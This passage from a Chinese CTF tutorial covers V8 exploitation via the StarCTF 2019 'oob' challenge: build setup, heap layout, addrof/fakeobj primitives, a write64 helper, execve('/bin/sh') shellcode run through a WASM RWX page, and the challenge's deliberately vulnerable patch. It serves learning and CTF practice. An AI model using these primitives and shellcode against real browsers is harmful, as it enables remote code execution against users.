---
title: 【微信】V8 漏洞利用入门：从 StarCTF 2019 OOB 到任意读写与 WASM RCE
source: https://mp.weixin.qq.com/s/UJ2JjM0Eojs8vYSQcZXRaA
source_host: mp.weixin.qq.com
clip_date: 2026-09-29T18:31:49+08:00
trace_id: 20def649-41c4-4259-8df9-bf0ff9af922e
content_hash: 02c1a8a5cd19a280a47cfea208061365d3e3c81db578bc68b5fbdbcfd815f6e5
status: synced
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: V8 漏洞利用的通用链路是：漏洞只需改写某 JSArray 的 map，即可构造 addrof/fakeobj 原语拿到任意读写，再把 shellcode 写进 WASM 的 RWX 页调用导出函数完成 RCE。
ai_summary_style: key-points
images_status:
  total: 53
  succeeded: 53
  failed_urls: []
notion_page_id: 3ea75244-d011-813e-92cb-f4b28509cf3a
ioc:
  cves: []
  cwes: []
  hashes:
    - 5a2307d0f2c5b650c6858e2b9b57b335a59946ff
    - 6dc88c191f5ecc5389dc26efa3ca0907faef3598
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> V8 漏洞利用的通用链路是：漏洞只需改写某 JSArray 的 map，即可构造 addrof/fakeobj 原语拿到任意读写，再把 shellcode 写进 WASM 的 RWX 页调用导出函数完成 RCE。
> 
> - **环境搭建：** 用 depot_tools 的 `fetch v8`，`gclient sync -D` 拉依赖，`gn gen out/x64.release` 配参数后 `time autoninja -C out/x64.release d8` 编译，12G/16 核约 9 分钟；老版本（StarCTF 2019）依赖 python2，需开 Ubuntu 20.04 docker 并手动装 ninja-build、pkg-config。
> - **调试要点：** 把 `v8/tools/gdbinit` 加入 `~/.gdbinit` 获得 job 等命令；d8 运行需加 `--allow-natives-syntax` 才能用 `%DebugPrint`、`%SystemBreak`；`job` 的参数必须是"真实地址 + 1"（tagged pointer 最低位），否则被解析成 Smi。
> - **最小漏洞需求：** 无论 OOB/UAF/类型混淆，本质只需能改写某个 JSArray 的 map 字段；StarCTF 2019 的 patch 在 `Array.prototype` 上加了 `oob`，等价提供一次 8 字节越界读写。
> - **利用链固定：** `ftoi/itof` 做 double 与 64 位整数互转 → 用 oob 读 map 得到 `obj_arr_map/float_arr_map` 实现 addrof/fakeobj → 伪造 JSArray 改 `elements` 指针实现 arb_read/arb_write → 改 `ArrayBuffer.backing_store` 后用 DataView 写 shellcode → 调用 wasm 导出函数 `f()`。
> - **版本差异：** 老版本 WASM 的 RWX 页在 instance+0x68 附近；12.8 开启 sandbox 后位于 `WasmTrustedInstanceData` 的 `trusted_data + 0x38`，且 backing_store 存的是压缩偏移（真实地址减 sandbox base 后左移 24 位），想直接写 RWX 必须先做 sandbox escape。

**看雪学苑** *2026年9月29日 18:07*

环境搭建

原文作者选择在win上用WSL编译，笔者因为电脑比较得劲就开个ubuntu编译

分配了12G内存、16核，time autoninja看了一下大概9min就好了。

这里得先装一个git，然后装depot_tools

```bash
cd ~

git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git

export PATH="$HOME/depot_tools:$PATH"
```

我们用fetch v8会拉下v8源码后直接创一个v8目录，不用特地mkdir v8

随后：

```
./build/install-build-deps.sh
```

这个可以自动装一些小工具，gclient sync下载依赖。

```
$ gn gen out/x64.release --args='放编译参数，正常会给args.gn'
```

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/972d82d0e4dc4b2e.jpg)  

用autoninja -C out/x64.release d8编译，前面加个time可以算时间

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/00c3f308079e7690.jpg)

如果题目给了commit，可以在gclient sync之前

git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff（这个会把修改切没掉，只切版本的话就用git checkout）

推荐用gclient sync -D，可以把不需要的依赖删掉

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0aa737e33219facc.jpg)

  

如果题目提供了patch就在gclient sync -D后打一下git apply <./patch

自动编译

原文出于方便编译任意版本的目的写了build.sh，不过对于初学者来说还是先手搓好

这部分属于额外环境封装，跳过。

## 通用利用链

在正常做ctf时一般都有一个明确的目标，拿shell或者orw，原文认为在v8中的目标就是执行任意shellcode

## v8调试

首先把v8/tools/gdbinit加入到~/.gdbinit中

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/761a4d2c66514522.jpg)

  
这样在用gdb启动d8时就能用v8的调试指令

接下来在d8目录中vim一个test.js

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f3a4b727eb69f793.jpg)

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/412e3bd131f2269c.jpg)

  

这里得加入--allow-natives-syntax，d8里没有%这种东西

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/28a2282ff5cbddaf.jpg)

  
%DebugPrint()打印对象在v8内的表示

这里的prototype表示原型对象，JavaScript 对象找不到某个属性时，会沿着 `prototype` 链继续往上找

\[PACKED_SMI_ELEMENTS (COW)\] COW表示copy on write，写时复制

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/68d8482d5173ea84.jpg)

  

map本身也是v8 heapobject，所以map也有map

普通 JS 对象的类型信息 → Map

Map 自己的类型信息 → MetaMap

properties = 按名字访问

elements = 按数字下标访问

tagged pointer: 因为堆对象地址按字节对齐，最低几位本来通常是 0，V8 就拿这些位来区分“这是整数还是堆对象指针”

最低位 = 0 → Smi 小整数

最低位 = 1 → HeapObject 指针

### gdb启动

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/91e8a9b78e0dca75.jpg)

  

gdb进入d8后用r --allow-natives-syntax test.js运行js命令

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/167ff18b7f82452d.jpg)

  

这样就方便用gdb看内存了

前面提到了v8的gdbinit,里面给gdb加了一些辅助调试命令，job就跟%DebugPrint()差不多

不过这里得注意一下

因为 `job` 操作的是 **V8 的 Tagged Pointer**，而“真实地址”是 **去掉 tag 后的对**

**象起始地址**

所以job后面的参数为真实地址+1

如果启用了 Pointer Compression，还可能再多一层压缩指针到完整地址的转换

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ed15ae5e456f05a1.jpg)

  

如果参数是真实地址，会被解析成Smi

## wasm

Wasm（WebAssembly）是一种 **面向虚拟机的二进制指令格式**，主要目的是让 C/C++、Rust 等现有代码能进入web，而不是得全部重写成JS

v8可以把这种二进制指令格式编译成机器码执行

```
C / C++ / Rust
      │
      │ 编译
      ▼
WebAssembly
    (.wasm)
      │
      ▼
Chrome / V8 / Firefox / Wasmtime
      │
      ▼
   机器码执行
```

JS调用wasm（一般就是通过浏览器提供的 `WebAssembly` API）常常是为了把高性能或者底层任务交给wasm

基本现代浏览器都支持wasm，老v8会生成一段rwx内存给wasm用，现代就复杂一点

vim一个js看看

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9673a3ddd6023cec.jpg)

```javascript
%SystemBreak();
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
%DebugPrint(f);
%DebugPrint(wasmInstance);
%SystemBreak();
```

我们先看看这个无符号8位整数array表示了什么。

`Uint8Array` 里面每个数字都是一个字节，整体就是一个 `.wasm` 文件的原始二进制内容。

等价于

```go
(module
(type $t0 (func (result i32)))

(func $main (type $t0)(result i32)
i32.const 42
)

(table 0 funcref)

(memory 1)

(export "memory" (memory 0))
(export "main" (func 0))
)
```

memory（）导出一块 Wasm Linear Memory

main（）return 42

wasmModule这一步是将wasmCode转化成v8可以识别的程序模板（Module可便于创建多个独立运行的实例）

wasmInstance真正实例化

var f = wasmInstance.exports.main;

从 `wasmInstance` 导出的内容里，取出名为 `main` 的 Wasm 函数，然后保存到变量 `f`

wasmInstance.exports表示这个Wasm实例对JS暴露出来的所有东西（memory、main）

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1cb52fa3c3c98538.jpg)

  

在第二个断点处我们发现它生成了一段rwx

现在的问题变成我们如何得到该地址

先看看%DebugPrint(f)输出了什么

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/65edd305743823c1.jpg)

  

可以看出这是一个函数对象

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e188f37e802b3507.jpg)

`SharedFunctionInfo` ，简称 **SFI**，保存函数相对静态的元数据

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c82b38a6cc487ef9.jpg)

  

用job查看shared_info

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/91b4d1eccd9d9481.jpg)

  

查看data结构

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/31dfc52a6abe01ba.jpg)

  

看看instance

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ebbed40ae62ff5da.jpg)

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2cac81365c4c3563.jpg)

  

注意到该地址与WasmInstanceObject重合

原文的rwx在instance+68，我这里编译出来的d8是12.8（开了sandbox），用jump table能找出来，原文instance那还真没有。

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/11e17db787350e23.jpg)

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a729024dc534d153.jpg)

  
在12.8.0中WasmTrustedInstanceData的trusted_data + 0x38处

现在的目的就是把shellcode写进wasm的rwx段然后执行

## 任意读写

先看看两种变量类型的结构

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fd60e7c9f5ff04d2.jpg)

  

### 先看看a

```swift
DebugPrint: 0x36e100047ff9: [JSArray]
-map:0x36e10018cd1d <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
-prototype:0x36e10018c691 <JSArray[0]>
-elements:0x36e100047fe9 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
-length:1
-properties:0x36e100000725 <FixedArray[0]>
-All own properties (excluding elements): {
0x36e100000d99: [String] in ReadOnlySpace:#length: 0x36e10028827d <AccessorInfo name= 0x36e100000d99 <String[6]: #length>, data= 0x36e100000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
}
-elements:0x36e100047fe9 <FixedDoubleArray[1]> {
0:2.1
}
0x36e10018cd1d: [Map] in OldSpace
-map:0x36e1001816d9 <MetaMap (0x36e100181729 <NativeContext[295]>)>
-type:JS_ARRAY_TYPE
-instance size:16
-inobject properties:0
-unused property fields:0
-elements kind:PACKED_DOUBLE_ELEMENTS
-enum length:invalid
-back pointer:0x36e10018ccdd <Map[16](HOLEY_SMI_ELEMENTS)>
-prototype_validity cell:0x36e100000a89 <Cell value= 1>
  - instance descriptors #1: 0x36e10018cca9 <DescriptorArray[1]>
  - transitions #1: 0x36e10018cd45 <TransitionArray[4]>
  Transition array #1:0x36e100000e5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x36e10018cd5d <Map[16](HOLEY_DOUBLE_ELEMENTS)>
-prototype:0x36e10018c691 <JSArray[0]>
-constructor:0x36e10018c389 <JSFunction Array (sfi = 0x36e10028d6cd)>
-dependent code:0x36e100000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
-construction counter:0
```

```yaml
pwndbg> x/8gx 0x36e100047ff9-1
0x36e100047ff8:    0x000007250018cd1d    0x0000000200047fe9
0x36e100048008:    0x00000725001985e9    0x0000000200000725
0x36e100048018:    0x0001000100000685    0x0000074d00000000
0x36e100048028:    0x0000008400002b09    0x0000056d00000002
pwndbg> x/8gx 0x36e100047fe9-1
0x36e100047fe8:    0x00000002000008a9    0x4000cccccccccccd
0x36e100047ff8:    0x000007250018cd1d    0x0000000200047fe9
0x36e100048008:    0x00000725001985e9    0x0000000200000725
0x36e100048018:    0x0001000100000685    0x0000074d00000000
```

内存大概长这样

注意到这里开了 **指针压缩**，很多字段只有 `4 bytes`

```
cage base = 0x36e100000000

              FixedDoubleArray
0x...47fe8 ┌────────────────────────────┐
           │ map    = 0x000008a9        │ 4B
           │ length = 0x00000002 Smi(1) │ 4B
0x...47ff0 │ 0x4000cccccccccccd         │ 8B
           │          = 2.1             │
           └────────────────────────────┘

                    JSArray
0x...47ff8 ┌────────────────────────────┐
           │ map = 0x0018cd1d           │ 4B
           │ properties = 0x00000725    │ 4B
0x...48000 │ elements = 0x00047fe9      │ 4B
           │ length = 0x00000002 Smi(1) │ 4B
           └────────────────────────────┘
0x...48008       下一个 HeapObject
```

注意到这一次 `a` 的 `FixedDoubleArray` backing store 恰好位于 `a` 对象之前。如果漏洞允许对该 backing store 进行越界读写，那么越过其末尾后，就可能访问相邻堆对象的 `map` 、 `properties` 、 `elements` 、 `length`

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8fa7167d610a99a9.jpg)

  

这里是因为压缩指针下 Smi 只有 31 位且强制 值<<1(最低位必须为 0),塞不进任意 64 位值，读出来也被抹掉最低位

### b跟c

```swift
DebugPrint: 0x36e100048009: [JS_OBJECT_TYPE]
-map:0x36e1001985e9 <Map[16](HOLEY_ELEMENTS)> [FastProperties]
-prototype:0x36e100182611 <Object map = 0x36e100181c25>
 - elements: 0x36e100000725 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x36e100000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x36e100002b09: [String] in ReadOnlySpace: #a: 1 (const data field 0, attrs: [WEC]) @ Any, location: in-object
 }0x36e1001985e9: [Map] in OldSpace
-map:0x36e1001816d9 <MetaMap (0x36e100181729 <NativeContext[295]>)>
-type:JS_OBJECT_TYPE
-instance size:16
-inobject properties:1
-unused property fields:0
-elements kind:HOLEY_ELEMENTS
-enum length:invalid
-stable_map
-back pointer:0x36e1001985c1 <Map[16](HOLEY_ELEMENTS)>
-prototype_validity cell:0x36e100000a89 <Cell value= 1>
 - instance descriptors (own) #1: 0x36e100048019 <DescriptorArray[1]>
 - prototype: 0x36e100182611 <Object map = 0x36e100181c25>
 - constructor: 0x36e100182139 <JSFunction Object (sfi = 0x36e10028cc7d)>
 - dependent code: 0x36e100000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
DebugPrint: 0x36e100048041: [JSArray]
-map:0x36e10018cd9d <Map[16](PACKED_ELEMENTS)> [FastProperties]
-prototype:0x36e10018c691 <JSArray[0]>
-elements:0x36e100048035 <FixedArray[1]> [PACKED_ELEMENTS]
-length:1
-properties:0x36e100000725 <FixedArray[0]>
-All own properties (excluding elements): {
0x36e100000d99: [String] in ReadOnlySpace:#length: 0x36e10028827d <AccessorInfo name= 0x36e100000d99 <String[6]: #length>, data= 0x36e100000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
-elements:0x36e100048035 <FixedArray[1]> {
0:0x36e100048009 <Object map = 0x36e1001985e9>
 }0x36e10018cd9d: [Map] in OldSpace
-map:0x36e1001816d9 <MetaMap (0x36e100181729 <NativeContext[295]>)>
-type:JS_ARRAY_TYPE
-instance size:16
-inobject properties:0
-unused property fields:0
-elements kind:PACKED_ELEMENTS
-enum length:invalid
-back pointer:0x36e10018cd5d <Map[16](HOLEY_DOUBLE_ELEMENTS)>
-prototype_validity cell:0x36e100000a89 <Cell value= 1>
 - instance descriptors #1: 0x36e10018cca9 <DescriptorArray[1]>
 - transitions #1: 0x36e10018cdc5 <TransitionArray[4]>
   Transition array #1:
     0x36e100000e5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x36e10018cddd <Map[16](HOLEY_ELEMENTS)>
 - prototype: 0x36e10018c691 <JSArray[0]>
 - constructor: 0x36e10018c389 <JSFunction Array (sfi = 0x36e10028d6cd)>
 - dependent code: 0x36e100000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

let b = {"a": 1};

let c = \[b\];

变量 `c` 是一个数组，数组里唯一的元素就是对象 `b`

```
pwndbg> job 0x36e100048035
0x36e100048035: [FixedArray]
-map:0x36e10000056d <Map(FIXED_ARRAY_TYPE)>
-length:1
0:0x36e100048009 <Object map = 0x36e1001985e9>
pwndbg> x/8gx 0x36e100048041-1
0x36e100048040:0x000007250018cd9d0x0000000200048035
0x36e100048050:0x00000000000000000x0000000000000000
0x36e100048060:0x00000000000000000x0000000000000000
0x36e100048070:0x00000000000000000x0000000000000000
pwndbg> x/8gx 0x36e100048035-1
0x36e100048034:0x000000020000056d0x0018cd9d00048009
0x36e100048044:0x00048035000007250x0000000000000002
0x36e100048054:0x00000000000000000x0000000000000000
0x36e100048064:0x00000000000000000x0000000000000000
```

变量 `c` 和变量 `a` 本身都是 `JSArray` ，因此 JSArray 对象头的结构基本相同。区别主要在 `elements` 指向的 backing store。 `a` 是 `PACKED_DOUBLE_ELEMENTS` ，使用 `FixedDoubleArray` ，其中每个元素直接保存一个 64-bit double； `c` 是 `PACKED_ELEMENTS` ，使用 `FixedArray` ，其中对象元素以 Tagged Pointer 保存。

在开启 Pointer Compression 的情况下，这些 Tagged Pointer 被压缩为 32 bit，因此 `c` 的每个元素槽位是 32 bit

## 任意变量地址读

我们看看V8 利用里最经典的两个原语：

-   `addressOf / addrof`
    
    **对象 → 地址**
    
-   `fakeObj / fakeobj`
    
    **地址 → 对象**
    

Map 中的 ElementsKind 决定 V8 用什么方式解释 `elements` 里的 bit

```
a.map → PACKED_DOUBLE_ELEMENTS
a.elements:
| map | length | 64-bit IEEE754 double |

c.map → PACKED_ELEMENTS
c.elements:
| map | length | 32-bit compressed Tagged Pointer | ...
```

内存本身只是一堆 bit。真正决定这 32/64 bit 到底应该被当成 double，还是对象引用的是 `Map → ElementsKind。`

如果把变量 `c` 的map地址改成变量 `a` 的，那么当执行 `c[0]` 的时候，获取到的就是变量 `b` 的地址。

这就是addrof函数的目的。

## double to object

fakeobj:把浮点数组伪装成对象数组

## 利用模板概览

**漏洞本身只负责一件事：改写某个 JSArray 的 map 字段**

具体漏洞(OOB / UAF / 类型混淆)唯一要求:能把某个 JSArray 的 map 改成另一种数组的 map

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/09cf791dab8b154a.png)

之后的利用链全部固定：map 混淆 → `addrof` / `fakeObj` 原语 → 任意读写 → 劫持 `backing_store` → 写 WASM RWX 页 → 触发执行

\[触发层\] 漏洞 → JSArray 元数据可控(map / length / elements)

\[原语层\] addrof ⇄ fakeobj(同一操作的镜像)→ fake_array+fake_object → read64/write64

\[执行层\] 改 ArrayBuffer.backing_store → DataView 写 shellcode → 调 wasm 导出函数

## 写shellcode

```
function write64(addr, data)
{
    fake_array[1] = itof(addr - 0x8n + 0x1n); // ① 伪造 elements 指针
    fake_object[0] = itof(data);  // ②③ 引擎按 double 数组语义写入
}
```

由fake_array和fake_object构造的write64不能直接把shellcode写入rwx

elements 字段只有 32 位，解压规则是固定拼接 cage base，最主要的原因就是rwx段在解压缩指针的4GB范围内不可达。

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d4ff12b8146f78fa.jpg)  
write64 的目标地址前面 8 字节\*\*必须可读且内容凑合合法，\*\*而 RWX 段起始地址的前 8 字节(`rwx−8`)落在映射之外(未映射页/保护区域)，第一次解引用就段错误。

`f()` 的调用落点固定在 RWX 区域入口，rwx+8也不可取

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9f2374dba4057f94.jpg)

先vim一下

  

程序先申请了一块 **16 字节的小内存**，叫 `data_buf` 。

然后又创建了一个 `DataView` ，专门用来读写这块内存。

接着程序通过这个工具，把数字 `2.0` 写到这块内存的最开头，占用前 8 个字节

```swift
DebugPrint: 0x1db000048039: [JSArrayBuffer]                         
-map:0x1db000189c91 <Map[52](HOLEY_ELEMENTS)> [FastProperties]                                                                       
-prototype:0x1db000189e25 <Object map = 0x1db000189cb9>                                                                              
 - elements: 0x1db000000725 <FixedArray[0]> [HOLEY_ELEMENTS]                                                                            
 - cpp_heap_wrappable: 0                                            
 - backing_store: 0x1db100000000                                    
 - byte_length: 16                                                  
 - max_byte_length: 16                                              
 - detach key: 0x1db000000069 <undefined>                           
 - detachable                                                       
 - properties: 0x1db000000725 <FixedArray[0]>                       
 - All own properties (excluding elements): {}                      0x1db000189c91: [Map] in OldSpace                                   
-map:0x1db0001816d9 <MetaMap (0x1db000181729 <NativeContext[295]>)>                                                                  
-type:JS_ARRAY_BUFFER_TYPE                                       
-instance size:                                                

-inobject properties:                                           

-unused property fields:                                        

-elements kind:HOLEY_ELEMENTS                                    
-enum length:invalid                                             
-stable_map                                                       
-back pointer:0x1db000000069 <undefined>                         
-prototype_validity cell:0x1db000000a89 <Cell value= 1>                                                                              
 - instance descriptors (own) #0: 0x1db000000759 <DescriptorArray[0]>                                                                   
 - prototype: 0x1db000189e25 <Object map = 0x1db000189cb9>                                                                              
 - constructor: 0x1db000189c41 <JSFunction ArrayBuffer (sfi = 0x1db000291bfd)>                                                          
 - dependent code: 0x1db000000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>                                                            
 - construction counter: 0                                          
DebugPrint: 0x1db00004806d: [JSDataView]                            
-map:0x1db000187561 <Map[48](HOLEY_ELEMENTS)> [FastProperties]                                                                       
-prototype:0x1db000187781 <Object map = 0x1db000187589>                                                                              
 - elements: 0x1db000000725 <FixedArray[0]> [HOLEY_ELEMENTS]                                                                            
 - buffer =0x1db000048039 <ArrayBuffer map = 0x1db000189c91>                                                                            
 - byte_offset: 0                                                   
 - byte_length: 16                                                  
 - properties: 0x1db000000725 <FixedArray[0]>                       
 - All own properties (excluding elements): {}                      0x1db000187561: [Map] in OldSpace                                   
-map:0x1db0001816d9 <MetaMap (0x1db000181729 <NativeContext[295]>)>                                                                  
-type:JS_DATA_VIEW_TYPE                                          
-instance size:                                                

-inobject properties:                                           

-unused property fields:                                        

-elements kind:HOLEY_ELEMENTS                                    
-enum length:invalid                                             
-stable_map                                                       
-back pointer:0x1db000000069 <undefined>                         
-prototype_validity cell:0x1db000000a89 <Cell value= 1>                                                                              
 - instance descriptors (own) #0: 0x1db000000759 <DescriptorArray[0]>                                                                   
 - prototype: 0x1db000187781 <Object map = 0x1db000187589>                                                                              
 - constructor: 0x1db00018752d <JSFunction DataView (sfi = 0x1db000292b5d)>                                                             
 - dependent code: 0x1db000000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>                                                            
 - construction counter: 0
```

这里有一个跟原文不一样的地方，原文没开sandbox，backing store是malloc 原生堆的裸指针。

我这里编译开了sandbox

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/06bb0ea8e6aee4ea.png)

### data_buf

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0cecec493e1b8fdc.jpg)

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4b8b480508b56c5d.jpg)

  

double型的2.0就是0x4000000000000000

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b4ef83e7c4075354.jpg)

  

可以看处data_buf的值存储在一段连续的地址中

原文的思路是通过修改 `backing_store` 字段的值为rwx内存地址，来达到写 `shellcode` 的目的。

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0b2e1e6bdbcc8415.jpg)

  

我们发现 backing_store 那 8 字节存的不是 `0x1db100000000` 本身

```
真实地址
0x1db100000000

        ↓ 减 sandbox base
offset = 0x1db100000000 - 0x1db000000000
       = 0x100000000
        ↓ 左移 24 bit
raw = 0x100000000 << 24
    = 0x0100000000000000
```

这里还想copy_shellcode_to_rwx 就得打sandbox escape了

## 利用

```
var shellcode = [
  0x2fbb485299583b6an,
  0x5368732f6e69622fn,
  0x050f5e5457525f54n   //execve(/bin/sh,0,0)
];
copy_shellcode_to_rwx(shellcode, rwx_page_addr);
f();
```

通过f（）执行shellcode

## starctf 2019 OOB

https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/

这里有完整的patch

## 环境构造

```bash
git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
gclient sync -D
cd ..
vim oob.diff
cd v8
git apply ../oob.diff
python2 build/linux/sysroot_scripts/install-sysroot.py --arch=amd64
```

这里编译的时候遇到一个问题，v8的版本太老得用到python2，但apt不提供了，只能开个docker了。

```bash
docker run -it \
  --name v8-startctf \
  -v ~/v8:/work \
  ubuntu:20.04 \
  bash
apt update
apt install -y python2 git curl ca-certificates build-essential
```

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/63e40dd417ebc7ee.jpg)

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/43d7c914c25ccddb.jpg)

```bash
python build/linux/sysroot_scripts/install-sysroot.py --arch=amd64
apt install -y pkg-config
./buildtools/linux64/gn gen out.gn/x64_startctf.release --args='
v8_monolithic=true
v8_use_external_startup_data=false
is_component_build=false
is_debug=false
target_cpu="x64"
use_goma=false
goma_dir="None"
v8_enable_backtrace=true
v8_enable_disassembler=true
v8_enable_object_print=true
v8_enable_verify_heap=true
treat_warnings_as_errors=false
'
apt install -y ninja-build
time ninja -C out.gn/x64_startctf.release d8
```

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f147d8444b1d5a83.jpg)

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/508f02a3143479a2.jpg)

  

还挺快

  
记得把没用的docker删掉

## 分析

先看看patch

```python
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}

 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();

     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/49711513d30924da.jpg)

  

给所有 JavaScript 数组的原型 `Array.prototype` 新增了一个叫 `oob` （out of bounds）的方法，传入两个参数。

也就是 JS 里能这么调

```
